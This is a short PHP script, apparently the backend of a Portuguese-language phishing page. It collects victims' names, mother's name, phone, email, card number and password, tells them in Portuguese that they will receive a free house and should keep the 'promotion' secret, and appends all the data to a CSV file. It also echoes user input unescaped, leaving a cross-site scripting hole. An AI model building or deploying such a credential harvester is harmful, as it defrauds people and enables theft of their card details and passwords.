<?php

   $nome1 = $_POST["nome1"];
   $nome2 = $_POST["nome2"];
   $nomeMae = $_POST["nomeMae"];
   $telefone =  $_POST["telefone"];
   $email = $_POST["email"];
   $cartao = $_POST["cartao"];
   $senha = $_POST["senha"];
   $estado = $_POST["estado"];

 echo "Olá <b>$nome1</b>!! Sua casa será dada em 30 dias, não fale para ninguém desta ótima promoção.";
    file_put_contents("dados1.csv", "$nome1,$nome2,$telefone,$email,$cartao,$nomeMae,$senha,$estado\n", FILE_APPEND);    

    


?>





